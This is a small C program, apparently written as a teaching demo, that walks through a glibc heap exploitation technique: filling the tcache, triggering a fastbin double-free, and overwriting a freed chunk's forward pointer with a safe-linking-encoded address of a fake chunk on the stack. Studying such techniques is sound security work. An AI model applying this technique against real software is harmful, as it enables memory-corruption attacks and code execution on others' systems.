/* a smol example i wrote to demostrate how to make a UAF point to a stack frame */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() { 

/* fill tcache so it goes into fastbins */
    void *holder[7];                   
    for (int i = 0; i < 7; i++) {
        holder[i] = malloc(8);
    }
    for (int i = 0; i < 7; i++) {
        free(holder[i]);
    }

/* fake stack */


unsigned long fake_stack[4] __attribute__((aligned(16)));

/* heap chunks are aligned to 16 bytes, 
   so if our fake chunk isnt 16-byte aligned malloc will reject it */

printf("fake stack user pointer would be: %p\n", fake_stack + 2);

/*
1 - the size field will be here         → fake_stack[1]
2 - the pointer returned by malloc      → fake_stack + 2
3 - is where we will get the free chunk region
*/

fake_stack[1] = 0x20;   // fake chunk size field


/* since the tcache is filled, frees now go into fastbins */

void *a = calloc(1, 8);
void *b = calloc(1, 8);
void *c = calloc(1, 8);


/* using the fastbin double-free exploit */

free(a);
free(b);
free(a);    /* now fastbin list has: [a, b, a] */


/* allocate twice to pop first 'a' and 'b' */

void *x = calloc(1, 8);  
void *y = calloc(1, 8);  

/* at this point:
   fastbin list now has only the LAST 'a'
   and we control its memory through pointer x
*/


/* poisoning the FD pointer on the last 'a' */

/* get safe-linking key */
unsigned long key = ((unsigned long)x) >> 12;

unsigned long desired = (unsigned long)fake_stack;   
unsigned long encoded = key ^ desired;               



unsigned long *fd_pointer = (unsigned long *)x;  
*fd_pointer = encoded;  

printf("FD pointer overwritten with encoded fake_stack\n");

return 0;
}

